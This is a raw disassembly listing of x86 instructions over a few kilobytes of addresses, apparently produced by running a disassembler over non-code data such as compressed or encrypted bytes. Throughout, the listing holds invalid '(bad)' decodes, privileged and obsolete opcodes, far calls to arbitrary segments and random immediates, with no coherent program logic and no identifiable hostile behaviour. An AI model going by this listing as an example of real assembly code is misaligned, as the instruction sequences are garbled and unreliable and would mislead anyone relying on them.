  41ec8f:	fist   WORD PTR [esi+0x3]
  41ec92:	in     al,dx
  41ec93:	xor    cl,BYTE PTR [edi+0x31af6dae]
  41ec99:	inc    ebp
  41ec9a:	xor    al,BYTE PTR [esi-0x1545761b]
  41eca0:	test   al,0xbc
  41eca2:	pusha  
  41eca3:	inc    edi
  41eca4:	sbb    ah,dh
  41eca6:	clc    
  41eca7:	daa    
  41eca8:	mov    al,0xcd
  41ecaa:	pop    esi
  41ecab:	popa   
  41ecac:	and    eax,0x715d4378
  41ecb1:	sub    BYTE PTR [edi-0x2e],cl
  41ecb4:	jb     0x41ed32
  41ecb6:	popf   
  41ecb7:	gs xchg esi,eax
  41ecb9:	imul   dl
  41ecbb:	push   es
  41ecbc:	sbb    eax,0xdd914578
  41ecc1:	sbb    BYTE PTR [eax-0x7793546f],bh
  41ecc7:	xor    eax,0x2789b345
  41eccc:	push   ebp
  41eccd:	pop    es
  41ecce:	mov    edi,0x9a76c129
  41ecd3:	retf   
  41ecd4:	test   eax,0xae4e520b
  41ecd9:	push   ss
  41ecda:	jp     0x41ecbd
  41ecdc:	test   DWORD PTR [edi],ebp
  41ecde:	and    eax,0xca2c7b40
  41ece3:	jne    0x41ec70
  41ece5:	pop    edx
  41ece6:	imul   ebp,esp,0xffffffe8
  41ece9:	add    edx,eax
  41eceb:	lahf   
  41ecec:	fdivr  QWORD PTR [edi]
	...
  41ed56:	inc    ecx
  41ed57:	icebp  
  41ed58:	(bad)
  41ed5b:	hlt    
  41ed5c:	gs icebp 
  41ed5e:	dec    edi
  41ed5f:	adc    eax,0xcf25fd0
  41ed64:	cmp    eax,0x14b6756
  41ed69:	add    BYTE PTR [eax],al
  41ed6b:	add    DWORD PTR [eax],eax
  41ed6d:	add    BYTE PTR [edx-0x80],cl
  41ed70:	adc    ebp,DWORD PTR [edi-0x7c12c997]
  41ed76:	pop    eax
  41ed77:	mov    esp,0xd3d8ebf6
  41ed7c:	ins    DWORD PTR es:[edi],dx
  41ed7d:	pop    ebp
  41ed7e:	jnp    0x41ed71
  41ed80:	stos   DWORD PTR es:[edi],eax
  41ed81:	pop    ss
  41ed82:	popa   
  41ed83:	sub    dh,0x1a
  41ed86:	ss (bad) 
  41ed88:	shr    BYTE PTR [esi-0x4923e2c4],cl
  41ed8e:	push   ebx
  41ed8f:	fimul  DWORD PTR [esi]
  41ed91:	loop   0x41ede5
  41ed93:	shr    DWORD PTR [eax+eax*1-0x6b597b08],cl
  41ed9a:	jecxz  0x41edb6
  41ed9c:	and    ebp,ebp
  41ed9e:	dec    esi
  41ed9f:	mov    eax,0x22bca595
  41eda4:	mov    eax,0xa1236a2a
  41eda9:	ss ss stc 
  41edac:	mov    esi,0xaa262b45
  41edb1:	add    ecx,DWORD PTR [edx]
  41edb3:	lds    ecx,FWORD PTR [eax+0x1d13f142]
  41edb9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41edba:	jbe    0x41edc3
  41edbc:	repz adc al,0x7f
  41edbf:	sbb    DWORD PTR [bp+si+0x51d2],edi
  41edc4:	outs   dx,DWORD PTR ds:[esi]
  41edc5:	pop    esp
  41edc6:	jbe    0x41ee24
  41edc8:	in     eax,0xfe
  41edca:	repz cs xor al,0x3d
  41edce:	ins    DWORD PTR es:[edi],dx
  41edcf:	sub    al,al
  41edd1:	std    
  41edd2:	cdq    
  41edd3:	ss out dx,eax
  41edd5:	popf   
  41edd6:	push   0xffffffc8
  41edd8:	mov    eax,ds:0x897ab08
  41eddd:	jle    0x41ede7
  41eddf:	mov    ?,WORD PTR [edi]
  41ede1:	ins    BYTE PTR es:[edi],dx
  41ede2:	xchg   esp,eax
  41ede3:	sbb    DWORD PTR [edx],edx
  41ede5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ede6:	iret   
  41ede7:	push   0x20
  41ede9:	retf   0x7c63
  41edec:	or     BYTE PTR [edi-0x22],bh
  41edef:	xor    edx,DWORD PTR [edi+esi*8-0x70]
  41edf3:	(bad)  
  41edf4:	xlat   BYTE PTR ds:[ebx]
  41edf5:	or     al,0x15
  41edf7:	mov    edx,DWORD PTR [edx-0x6fa8e1d4]
  41edfd:	cmp    eax,0x62ce5550
  41ee02:	ret    
  41ee03:	push   cs
  41ee04:	cmp    eax,0xbe3bbf77
  41ee09:	xchg   BYTE PTR [ecx],dl
  41ee0b:	lods   eax,DWORD PTR ds:[esi]
  41ee0c:	in     al,dx
  41ee0d:	sti    
  41ee0e:	add    eax,0x11b9c270
  41ee13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ee14:	mov    bl,0xbc
  41ee16:	les    ecx,FWORD PTR [ebp+0x55]
  41ee19:	and    al,0x40
  41ee1b:	mul    DWORD PTR [ebx]
  41ee1d:	(bad)  
  41ee1f:	add    eax,0xf8819282
  41ee24:	loope  0x41edac
  41ee26:	mov    WORD PTR [ebx],es
  41ee28:	adc    BYTE PTR [ebx+esi*4-0x55],0x7a
  41ee2d:	in     eax,dx
  41ee2e:	sar    BYTE PTR [ebp-0x2595c0bc],1
  41ee34:	inc    edi
  41ee35:	mov    ds:0x34357e11,al
  41ee3a:	call   0xf3bb:0x8c67ea1
  41ee41:	mov    al,ds:0xee999156
  41ee46:	xchg   ebp,eax
  41ee47:	cmp    ah,BYTE PTR [edx]
  41ee49:	mov    dh,bh
  41ee4b:	xchg   esp,eax
  41ee4c:	or     eax,0x53f06857
  41ee51:	div    DWORD PTR [edx-0x37e0d72b]
  41ee57:	out    dx,eax
  41ee58:	fistp  DWORD PTR [ebp+0x1ea8078d]
  41ee5e:	jmp    0x41edf3
  41ee60:	frstor [edx]
  41ee62:	cwde   
  41ee63:	xor    eax,0xa3359e45
  41ee68:	mov    ebp,0x6e0970bb
  41ee6d:	cmp    al,BYTE PTR [eax]
	...
  41eed3:	add    BYTE PTR [eax],al
  41eed5:	add    BYTE PTR ds:0x7b197956,al
  41eedb:	aas    
  41eedc:	gs pop esi
  41eede:	pop    edx
  41eedf:	repnz call 0x678c:0xa4ae8ae7
  41eee7:	dec    esp
  41eee8:	add    DWORD PTR [eax],eax
  41eeea:	add    BYTE PTR [ecx],al
  41eeec:	add    BYTE PTR [eax],al
  41eeee:	cmp    bh,BYTE PTR [esi]
  41eef0:	fist   DWORD PTR [edx+0x71]
  41eef3:	(bad)  
  41eef4:	cmp    al,0x73
  41eef6:	cld    
  41eef7:	jno    0x41ef1c
  41eef9:	add    BYTE PTR [eax-0x61],dh
  41eefc:	repz xlat BYTE PTR ss:[ebx]
  41eeff:	cld    
  41ef00:	rol    BYTE PTR [ecx-0x53],cl
  41ef03:	dec    ebp
  41ef04:	iret   
  41ef05:	sbb    BYTE PTR [eax],bl
  41ef07:	mov    ds:0x9e51f928,eax
  41ef0c:	js     0x41ef61
  41ef0e:	add    esi,DWORD PTR [edi+0x24]
  41ef11:	cmp    DWORD PTR ds:0x7a1684a1,edx
  41ef17:	popf   
  41ef18:	arpl   WORD PTR [ebx],cx
  41ef1a:	mov    ds:0x1e03cd50,al
  41ef1f:	cmp    DWORD PTR [ebp-0x40e7a341],0x53bd37d7
  41ef29:	dec    eax
  41ef2a:	mov    eax,gs
  41ef2c:	jp     0x41ef2c
  41ef2e:	imul   esp,DWORD PTR [edx+esi*8+0x7e5a960b],0x4c42f29b
  41ef39:	ins    BYTE PTR es:[edi],dx
  41ef3a:	sbb    bh,BYTE PTR [esp+edi*8-0x70]
  41ef3e:	out    0x1f,al
  41ef40:	fdiv   DWORD PTR [ecx+0x1cc7d4ec]
  41ef46:	pop    ss
  41ef47:	mov    dl,0x3e
  41ef49:	or     DWORD PTR [ecx-0x3],ecx
  41ef4c:	popf   
  41ef4d:	dec    ecx
  41ef4e:	int3   
  41ef4f:	arpl   WORD PTR [eax-0x24e4ad5b],si
  41ef55:	sar    ebp,1
  41ef57:	out    dx,eax
  41ef58:	ins    BYTE PTR es:[edi],dx
  41ef59:	and    eax,0xef4da577
  41ef5e:	lahf   
  41ef5f:	and    DWORD PTR fs:[ecx],0xce93dbcd
  41ef66:	sub    DWORD PTR [edi],ebx
  41ef68:	jo     0x41ef6a
  41ef6a:	call   0x5d37:0xa04ae3f7
  41ef71:	add    BYTE PTR [eax],ah
  41ef73:	int    0x1c
  41ef75:	adc    DWORD PTR [edi],ebx
  41ef77:	push   edx
  41ef78:	test   al,0xba
  41ef7a:	lds    ebp,FWORD PTR [ecx+0x3fbb6a32]
  41ef80:	daa    
  41ef81:	xchg   edx,eax
  41ef82:	add    al,0xb7
  41ef84:	test   al,0xaf
  41ef86:	add    esp,DWORD PTR [ecx]
  41ef88:	inc    edi
  41ef89:	ja     0x41ef18
  41ef8b:	ja     0x41efe4
  41ef8d:	mov    ebp,0x61b8770b
  41ef92:	cmp    ebp,DWORD PTR [eax-0x20609e9c]
  41ef98:	sbb    BYTE PTR [ebp+0x55],dh
  41ef9b:	ret    
  41ef9c:	mov    edi,DWORD PTR [ebx-0xb]
  41ef9f:	aaa    
  41efa0:	mov    ecx,0xd10dfc6b
  41efa5:	xchg   esi,eax
  41efa6:	out    dx,eax
  41efa7:	packsswb mm2,QWORD PTR [edx]
  41efaa:	test   eax,0x90a24f80
  41efaf:	cmp    ebx,0x46
  41efb2:	xor    BYTE PTR [ecx],dl
  41efb4:	shl    DWORD PTR [ebx+0x68e3daae],cl
  41efba:	int3   
  41efbb:	pop    es
  41efbc:	fidivr DWORD PTR [edi+0x1a]
  41efbf:	test   BYTE PTR [edi],ah
  41efc1:	cmp    BYTE PTR [edx],dh
  41efc3:	jmp    0x49f8eb56
  41efc8:	pop    ds
  41efc9:	(bad)  
  41efca:	cmp    dh,BYTE PTR [ebx-0x5b]
  41efcd:	pop    ds
  41efce:	dec    edi
  41efcf:	pop    edx
  41efd0:	fst    st(0)
  41efd2:	into   
  41efd3:	out    0x79,al
  41efd5:	cmp    bh,dl
  41efd7:	call   0x8d88e89f
  41efdc:	mov    al,0x42
  41efde:	adc    DWORD PTR [esp+eax*4+0x4e],ebx
  41efe2:	sbb    eax,0xcbec49b4
  41efe7:	call   0xdedb:0x136a236f
	...
  41f056:	mov    ecx,0xff25bf5d
  41f05b:	out    0xbb,eax
  41f05d:	fisttp QWORD PTR [ecx+0x0]
  41f060:	lock imul edx,DWORD PTR [ecx-0x68],0xfffffff5
  41f065:	dec    ecx
  41f066:	addr16 dec ebp
  41f068:	add    DWORD PTR [eax],eax
  41f06a:	add    BYTE PTR [ecx],al
  41f06c:	add    BYTE PTR [eax],al
  41f06e:	pop    esp
  41f06f:	push   ebp
  41f070:	rcl    BYTE PTR [ecx+0xbf8f1b8],1
  41f076:	cli    
  41f077:	out    0x56,al
  41f079:	(bad)  
  41f07a:	inc    DWORD PTR [ebx]
  41f07c:	mov    esp,DWORD PTR cs:[ecx+0x3ab6a237]
  41f083:	fcmove st,st(5)
  41f085:	cld    
  41f086:	inc    ecx
  41f087:	cmp    edx,DWORD PTR [ecx]
  41f089:	jl     0x41f087
  41f08b:	call   0x3990:0x5eb2d58e
  41f092:	into   
  41f093:	in     eax,dx
  41f094:	jo     0x41f0ae
  41f096:	dec    ebp
  41f097:	adc    eax,0x4ced12f1
  41f09c:	and    BYTE PTR [esi+0x4b],al
  41f09f:	push   ebx
  41f0a0:	jp     0x41f0d2
  41f0a2:	test   BYTE PTR [eax+eax*1],cl
  41f0a5:	mov    al,0xdd
  41f0a7:	lea    esi,[edx+0x77e5b153]
  41f0ad:	addr16 jge 0x41f0e3
  41f0b0:	mov    edx,0x92f751ca
  41f0b5:	fs mov ch,0xf2
  41f0b8:	test   al,0x5a
  41f0ba:	jne    0x41f050
  41f0bc:	fnsave [edx]
  41f0be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f0bf:	shr    BYTE PTR [ebp+ecx*2+0x56],cl
  41f0c3:	pop    esp
  41f0c4:	inc    edi
  41f0c5:	into   
  41f0c6:	cdq    
  41f0c7:	jmp    0xa058:0x3d0f46e2
  41f0ce:	push   ecx
  41f0cf:	add    BYTE PTR [esi+0x2],dl
  41f0d2:	cmp    eax,0x26e70b2f
  41f0d7:	and    BYTE PTR [ebx+ebx*4],dl
  41f0da:	push   edx
  41f0db:	jl     0x41f0b1
  41f0dd:	push   0x6c615e68
  41f0e2:	or     edx,DWORD PTR [eax+0x46596ad7]
  41f0e8:	fiadd  WORD PTR [ebx-0xad57d67]
  41f0ee:	pushf  
  41f0ef:	sbb    edx,DWORD PTR [edx+ebp*8]
  41f0f2:	pushf  
  41f0f3:	adc    BYTE PTR [esi+esi*4-0x6be87df7],dh
  41f0fa:	pusha  
  41f0fb:	add    edx,DWORD PTR [edi]
  41f0fd:	push   esp
  41f0fe:	push   ebx
  41f0ff:	cmc    
  41f100:	push   ecx
  41f101:	cmp    ecx,esp
  41f103:	(bad)  
  41f104:	cmp    al,0xf2
  41f106:	outs   dx,BYTE PTR ds:[esi]
  41f107:	and    eax,0xcc779b40
  41f10c:	mov    ecx,0xabce3bd1
  41f111:	mov    ebp,0xaf513ce3
  41f116:	not    BYTE PTR [ebx+esi*8+0x4e]
  41f11a:	dec    ebp
  41f11b:	add    eax,0x421126ff
  41f120:	mov    ch,0xed
  41f122:	mov    bl,ah
  41f124:	bound  edi,QWORD PTR [ecx+ecx*2-0x2a]
  41f128:	jmp    0x41f198
  41f12a:	sub    edx,DWORD PTR [esi+0x4f]
  41f12d:	ret    0x28a6
  41f130:	pop    esi
  41f131:	xchg   ecx,eax
  41f132:	and    BYTE PTR [ebx-0x9103fc2],0xe8
  41f139:	jmp    0x41f195
  41f13b:	je     0x41f13a
  41f13d:	leave  
  41f13e:	jge    0x41f174
  41f140:	and    eax,0x2af45261
  41f145:	mov    ebx,0x14c6705d
  41f14a:	mov    ch,BYTE PTR [esi-0x6a149ce4]
  41f150:	fcom   st(0)
  41f152:	cwde   
  41f153:	sti    
  41f154:	inc    edx
  41f155:	cmp    ebp,DWORD PTR [edi-0x3e532578]
  41f15b:	cmp    DWORD PTR [edi+0x1],ebx
  41f15e:	neg    DWORD PTR [edx+0x58]
  41f161:	jecxz  0x41f1c1
  41f163:	aad    0xcd
  41f165:	(bad)  
  41f166:	sub    cl,BYTE PTR [edx]
  41f168:	cmp    esi,DWORD PTR [eax+0x7de02278]
	...
  41f1d6:	fild   QWORD PTR [edx+ebp*1+0x6c]
  41f1db:	mov    ebx,0x3824ffdf
  41f1e0:	(bad)  
  41f1e1:	jmp    0x4e67:0xea776f5b
  41f1e8:	add    DWORD PTR [eax],eax
  41f1ea:	add    BYTE PTR [ecx],al
  41f1ec:	add    BYTE PTR [eax],al
  41f1ee:	adc    cl,BYTE PTR [ecx+0x21]
  41f1f1:	loopne 0x41f1f3
  41f1f3:	dec    edi
  41f1f4:	sub    al,0x23
  41f1f6:	mov    ds:0x5ef89f52,al
  41f1fb:	cmp    BYTE PTR [ebp+0x118bb7ab],dl
  41f201:	jmp    0xd0f0c328
  41f206:	xchg   DWORD PTR [eax-0x57cfb8cb],edi
  41f20c:	sbb    ah,BYTE PTR [edx]
  41f20e:	mov    gs,WORD PTR [ebx-0xf]
  41f211:	stc    
  41f212:	pop    esi
  41f213:	int    0x2b
  41f215:	mov    di,0x7f6f
  41f219:	mov    WORD PTR [edx-0x372189c7],ds
  41f21f:	push   edx
  41f220:	cwde   
  41f221:	cld    
  41f222:	xlat   BYTE PTR ds:[ebx]
  41f223:	adc    ecx,DWORD PTR [edi]
  41f225:	bnd je 0x41f1bf
  41f228:	popa   
  41f229:	pusha  
  41f22a:	icebp  
  41f22b:	push   ebp
  41f22c:	push   cs
  41f22d:	push   esp
  41f22e:	lahf   
  41f22f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f230:	push   cs
  41f231:	xor    eax,0xf54425b2
  41f236:	mov    ch,0x2f
  41f238:	jne    0x41f2a4
  41f23a:	inc    eax
  41f23b:	and    DWORD PTR [eax],0xc88ca95e
  41f241:	imul   ebx,DWORD PTR [ebp-0x20],0xffffffd8
  41f245:	mov    dl,0x3b
  41f247:	sub    ah,dl
  41f249:	mov    ch,0x6f
  41f24b:	rol    DWORD PTR [esp+ebp*4+0x3f74cdde],cl
  41f252:	loop   0x41f1db
  41f254:	clc    
  41f255:	pop    edi
  41f256:	jne    0x41f23d
  41f258:	aam    0x9c
  41f25a:	leave  
  41f25b:	push   ebx
  41f25c:	stos   DWORD PTR es:[edi],eax
  41f25d:	add    ebp,ecx
  41f25f:	call   0x7ffee41
  41f264:	sar    DWORD PTR [ecx],0x55
  41f267:	scas   al,BYTE PTR es:[edi]
  41f268:	out    0x6e,al
  41f26a:	outs   dx,DWORD PTR ds:[esi]
  41f26b:	in     eax,dx
  41f26c:	les    ebx,FWORD PTR ds:0xae4517ac
  41f272:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f273:	ret    
  41f274:	push   ebp
  41f275:	in     eax,dx
  41f276:	in     eax,dx
  41f277:	cmp    al,0xb3
  41f279:	add    BYTE PTR [ebx+0x12a6c26f],dl
  41f27f:	icebp  
  41f280:	call   0x87228821
  41f285:	xchg   esi,eax
  41f286:	xor    DWORD PTR [edi+0x6f92e3fb],0x7
  41f28d:	stos   BYTE PTR es:[edi],al
  41f28e:	inc    ebp
  41f28f:	xchg   edi,eax
  41f290:	mov    cl,0x8f
  41f292:	fstp   DWORD PTR [ebp+0x51]
  41f295:	sbb    BYTE PTR [eax-0x6826842],dl
  41f29b:	jl     0x41f2c7
  41f29d:	sub    al,0x50
  41f29f:	dec    eax
  41f2a0:	cld    
  41f2a1:	cmp    al,0x16
  41f2a3:	mov    eax,ds:0xa41a8835
  41f2a8:	leave  
  41f2a9:	in     al,0xa9
  41f2ab:	not    BYTE PTR [eax-0x6c]
  41f2ae:	pop    eax
  41f2af:	mov    ebp,DWORD PTR [edx-0x15]
  41f2b2:	ins    DWORD PTR es:[edi],dx
  41f2b3:	not    BYTE PTR [edi]
  41f2b5:	cmp    DWORD PTR [ecx],edx
  41f2b7:	push   eax
  41f2b8:	sahf   
  41f2b9:	popf   
  41f2ba:	setle  BYTE PTR [ebp-0x1caaaf75]
  41f2c1:	das    
  41f2c2:	fcomi  st,st(6)
  41f2c4:	ss add al,0x62
  41f2c7:	jg     0x41f2e2
  41f2c9:	aas    
  41f2ca:	and    ebx,DWORD PTR [eax]
  41f2cc:	pop    esi
  41f2cd:	(bad)  
  41f2ce:	xchg   ecx,eax
  41f2cf:	in     eax,0x3
  41f2d1:	shr    BYTE PTR [ecx],1
  41f2d3:	cdq    
  41f2d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f2d5:	mov    esp,0xd2c09c7a
  41f2da:	(bad)  
  41f2db:	adc    ch,BYTE PTR [edx-0x161ef0fa]
  41f2e1:	shr    DWORD PTR [ecx+0x2b],1
  41f2e4:	bound  esi,QWORD PTR [edi+eiz*8]
  41f2e7:	push   ebx
  41f2e8:	fnsave [ebp-0x4b]
  41f2eb:	fisttp DWORD PTR [esi]
  41f2ed:	mov    eax,ds:0x0
	...
  41f356:	push   ecx
  41f357:	sbb    edi,edi
  41f359:	jmp    si
  41f35c:	fnstcw WORD PTR [edi]
  41f35e:	jo     0x41f34d
  41f360:	sahf   
  41f361:	jb     0x41f387
  41f363:	lods   al,BYTE PTR ds:[esi]
  41f364:	test   al,0xe6
  41f366:	addr16 dec edi
  41f368:	add    DWORD PTR [eax],eax
  41f36a:	add    BYTE PTR [ecx],al
  41f36c:	add    BYTE PTR [eax],al
  41f36e:	mov    cl,0xfa
  41f370:	outs   dx,DWORD PTR ds:[esi]
  41f371:	mov    esi,DWORD PTR [eax+0x7e]
  41f374:	mov    eax,0xe2ea1dbe
  41f379:	inc    esp
  41f37a:	(bad)  
  41f37b:	mov    DWORD PTR [eax+0x1e],0x6f1eda88
  41f382:	(bad)  
  41f383:	sahf   
  41f384:	sub    eax,0xa2cd0979
  41f389:	sbb    eax,0x53cbab71
  41f38e:	outs   dx,DWORD PTR ds:[esi]
  41f38f:	or     edi,eax
  41f391:	mov    ecx,0x61cd911
  41f396:	and    ch,BYTE PTR [ebp+eiz*1-0x3d74669d]
  41f39d:	pushf  
  41f39e:	jae    0x41f330
  41f3a0:	icebp  
  41f3a1:	(bad)  
  41f3a2:	ins    BYTE PTR es:[edi],dx
  41f3a3:	mov    DWORD PTR [edi+0x7f1df32],ecx
  41f3a9:	inc    ebp
  41f3aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f3ab:	xchg   edx,eax
  41f3ac:	or     eax,0xd0ddae60
  41f3b1:	fimul  DWORD PTR [eax-0x4a2e3fd4]
  41f3b7:	pop    edx
  41f3b8:	and    al,0xde
  41f3ba:	cwde   
  41f3bb:	sbb    BYTE PTR [esi+0x4ea7d2fd],dl
  41f3c1:	dec    esp
  41f3c2:	aas    
  41f3c3:	ins    BYTE PTR es:[edi],dx
  41f3c4:	(bad)  [esi-0x4bf3d8b9]
  41f3ca:	pop    ss
  41f3cb:	(bad)  
  41f3cc:	icebp  
  41f3cd:	push   esi
  41f3ce:	adc    al,0x83
  41f3d0:	ror    esp,0xf6
  41f3d3:	pop    ebx
  41f3d4:	xchg   edx,eax
  41f3d5:	in     al,0x89
  41f3d7:	scas   al,BYTE PTR es:[edi]
  41f3d8:	jmp    esp
  41f3da:	je     0x41f3f8
  41f3dc:	cmc    
  41f3dd:	push   edi
  41f3de:	jb     0x41f3fe
  41f3e0:	imul   ebp,DWORD PTR [esi+0xb9acef0],0x85b3cedb
  41f3ea:	mov    DWORD PTR [esi+ebp*8+0x370811e2],ebx
  41f3f1:	or     cl,0x2
  41f3f4:	in     eax,dx
  41f3f5:	retf   
  41f3f6:	out    dx,eax
  41f3f7:	push   0x8355e718
  41f3fc:	sti    
  41f3fd:	enter  0x599b,0x43
  41f401:	sbb    ah,BYTE PTR [ebx]
  41f403:	(bad)  
  41f404:	(bad)  
  41f405:	enter  0x634,0xcf
  41f409:	(bad)  
  41f40a:	sbb    DWORD PTR [ecx-0x114e251c],ebx
  41f410:	comiss xmm2,DWORD PTR [esi+0xd]
  41f414:	jae    0x41f408
  41f416:	add    eax,0x222d814d
  41f41b:	push   0x9c91d381
  41f420:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f422:	inc    esp
  41f423:	adc    BYTE PTR [edx-0x737c66f],0xdd
  41f42a:	jp     0x41f45c
  41f42c:	xchg   esi,eax
  41f42d:	or     BYTE PTR [edx],bl
  41f42f:	pop    ds
  41f430:	mov    eax,0x5f1a7337
  41f435:	arpl   WORD PTR [esi+0x39a20243],cx
  41f43b:	shl    BYTE PTR [eax],1
  41f43d:	cmp    dh,BYTE PTR [eax+eax*2-0x62]
  41f441:	xor    BYTE PTR [edi+0x56fc513d],0xe9
  41f448:	mov    ebx,0x56452320
  41f44d:	xor    BYTE PTR [ecx],cl
  41f44f:	lock arpl si,bp
  41f452:	xor    ebx,eax
  41f454:	ds (bad) 
  41f456:	fadd   st,st(6)
  41f458:	dec    ebp
  41f459:	jbe    0x41f419
  41f45b:	pop    ss
  41f45c:	call   0x1853487e
  41f461:	popa   
  41f462:	je     0x41f485
  41f464:	cli    
  41f465:	test   DWORD PTR [edx-0x68],0xd1ef71b
  41f46c:	(bad)  
  41f46d:	fild   WORD PTR [eax]
	...
  41f4d3:	add    BYTE PTR [eax],al
  41f4d5:	add    BYTE PTR [edi+eiz*8],bh
  41f4d8:	imul   ebp,edi,0xfffffffb
  41f4db:	out    dx,eax
  41f4dc:	mov    esp,0xd5fd13f7
  41f4e1:	mov    ch,0x74
  41f4e3:	(bad)  
  41f4e4:	lahf   
  41f4e5:	hlt    
  41f4e6:	addr16 push eax
  41f4e8:	add    DWORD PTR [eax],eax
  41f4ea:	add    BYTE PTR [ecx],al
  41f4ec:	add    BYTE PTR [eax],al
  41f4ee:	icebp  
  41f4ef:	sahf   
  41f4f0:	inc    eax
  41f4f1:	aas    
  41f4f2:	(bad)  
  41f4f3:	dec    eax
  41f4f4:	test   eax,0x716fb667
  41f4f9:	ins    DWORD PTR es:[edi],dx
  41f4fa:	stos   BYTE PTR es:[edi],al
  41f4fb:	imul   eax,DWORD PTR [ebp+0x3104e115],0xe927428f
  41f505:	js     0x41f56b
  41f507:	sbb    al,BYTE PTR [ebx]
  41f509:	inc    ebx
  41f50a:	inc    esp
  41f50b:	pop    eax
  41f50c:	dec    ebp
  41f50d:	mov    edi,0x1dbe627d
  41f512:	adc    bl,al
  41f514:	jno    0x41f4bd
  41f516:	sbb    BYTE PTR [edi-0x6e6aa703],al
  41f51c:	xor    edi,DWORD PTR [esi+0x7d8c8930]
  41f522:	push   es
  41f523:	xchg   ebp,eax
  41f524:	stc    
  41f525:	aam    0xe7
  41f527:	fbld   TBYTE PTR [esi+0x4555499]
  41f52d:	inc    esi
  41f52e:	jg     0x41f58a
  41f530:	adc    eax,0x9385867e
  41f535:	adc    DWORD PTR [esi+0x295aaf0c],edx
  41f53b:	test   BYTE PTR [ecx],bh
  41f53d:	xor    al,0xd3
  41f53f:	lods   al,BYTE PTR ds:[esi]
  41f540:	mov    BYTE PTR [edi+0x738d432c],dl
  41f546:	jbe    0x41f51f
  41f548:	mov    edx,0x1658cfa2
  41f54d:	or     DWORD PTR [eax],0x9c5b3d05
  41f553:	inc    ecx
  41f554:	std    
  41f555:	jbe    0x41f58b
  41f557:	cdq    
  41f558:	in     eax,0x5a
  41f55a:	sub    DWORD PTR [edx+edi*1],esi
  41f55d:	add    esi,DWORD PTR [edx+0x46cdf9c6]
  41f563:	int    0x98
  41f565:	mov    bh,0xd5
  41f567:	mov    cl,dl
  41f569:	neg    DWORD PTR ds:[ebp+0x97564c]
  41f570:	int3   
  41f571:	adc    DWORD PTR [edi],esp
  41f573:	clc    
  41f574:	inc    ebx
  41f575:	mov    cl,0x1a
  41f577:	and    al,0x8e
  41f579:	pop    es
  41f57a:	sbb    dl,BYTE PTR [edi-0x4b]
  41f57d:	ret    
  41f57e:	cli    
  41f57f:	rol    DWORD PTR [edx-0x6e70ae28],1
  41f585:	lea    eax,[edi]
  41f587:	inc    edx
  41f588:	hlt    
  41f589:	inc    edi
  41f58a:	pop    esi
  41f58b:	dec    esi
  41f58c:	push   0xffffffb9
  41f58e:	add    DWORD PTR [ecx+esi*4+0x40893e75],ebx
  41f595:	leave  
  41f596:	pop    esi
  41f597:	aas    
  41f598:	mov    dl,0xd6
  41f59a:	cmp    DWORD PTR [ebx],edi
  41f59c:	mov    WORD PTR [esi-0x1f],ss
  41f59f:	call   0xd598:0xc93d5a00
  41f5a6:	data16 cmc 
  41f5a8:	imul   ebp,eax,0xa2c011d2
  41f5ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f5af:	adc    bh,ah
  41f5b1:	xchg   DWORD PTR [esi-0x4fc1c5c7],eax
  41f5b7:	inc    ecx
  41f5b8:	cmc    
  41f5b9:	mov    dh,0x1a
  41f5bb:	sbb    dh,BYTE PTR [ecx+0x5813974c]
  41f5c1:	inc    eax
  41f5c2:	xor    al,BYTE PTR [ecx]
  41f5c4:	out    0xed,al
  41f5c6:	(bad)  
  41f5c7:	jbe    0x41f5f3
  41f5c9:	mov    ds:0x1a1f9b77,al
  41f5ce:	cs retf 
  41f5d0:	mov    edx,0x930abf7a
  41f5d5:	cld    
  41f5d6:	cdq    
  41f5d7:	and    DWORD PTR [ebx+ebx*1],0x3c
  41f5db:	into   
  41f5dc:	hlt    
  41f5dd:	(bad)  
  41f5de:	test   al,0x8
  41f5e0:	int3   
  41f5e1:	(bad)  
  41f5e2:	jbe    0x41f577
  41f5e4:	sub    BYTE PTR [ebx],0xde
  41f5e7:	sub    al,0xc3
  41f5e9:	push   cs
  41f5ea:	mov    al,0x2f
  41f5ec:	test   al,0xdd
	...
  41f656:	js     0x41f68c
  41f658:	add    bh,bl
  41f65a:	dec    esi
  41f65b:	(bad)  
  41f65c:	stc    
  41f65d:	mov    bh,0xb7
  41f65f:	jmp    0x9158:0x8686d422
  41f666:	addr16 push ecx
  41f668:	add    DWORD PTR [eax],eax
  41f66a:	add    BYTE PTR [ecx],al
  41f66c:	add    BYTE PTR [eax],al
  41f66e:	aam    0xe4
  41f670:	push   edi
  41f671:	mov    esp,DWORD PTR [edi+0x38]
  41f674:	sahf   
  41f675:	loope  0x41f69f
  41f677:	or     eax,ebp
  41f679:	test   al,0x6e
  41f67b:	mov    esp,0x22b11aad
  41f680:	call   0x9235:0xa7d772b2
  41f687:	scas   eax,DWORD PTR es:[edi]
  41f688:	jae    0x41f627
  41f68a:	ins    BYTE PTR es:[edi],dx
  41f68b:	xchg   BYTE PTR [eax+0x21e93747],ch
  41f691:	or     esi,DWORD PTR [ebx]
  41f693:	jp     0x41f6c5
  41f695:	hlt    
  41f696:	ret    
  41f697:	or     esi,DWORD PTR [ebx-0x33]
  41f69a:	dec    edx
  41f69b:	dec    esp
  41f69c:	pop    es
  41f69d:	jp     0x41f6ca
  41f69f:	mov    ds:0xc5d0a370,al
  41f6a4:	clc    
  41f6a5:	adc    eax,eax
  41f6a7:	or     eax,0x88cf01d9
  41f6ac:	add    eax,edx
  41f6ae:	popa   
  41f6af:	push   edx
  41f6b0:	neg    eax
  41f6b2:	jg     0x41f642
  41f6b4:	inc    esi
  41f6b5:	ja     0x41f702
  41f6b7:	jae    0x41f65b
  41f6b9:	in     al,0xf4
  41f6bb:	dec    ecx
  41f6bc:	or     dl,BYTE PTR [edx-0x68]
  41f6bf:	clc    
  41f6c0:	xchg   esp,eax
  41f6c1:	add    DWORD PTR [ebp+0xd],0x12
  41f6c5:	ins    BYTE PTR es:[edi],dx
  41f6c6:	in     al,dx
  41f6c7:	stc    
  41f6c8:	jecxz  0x41f687
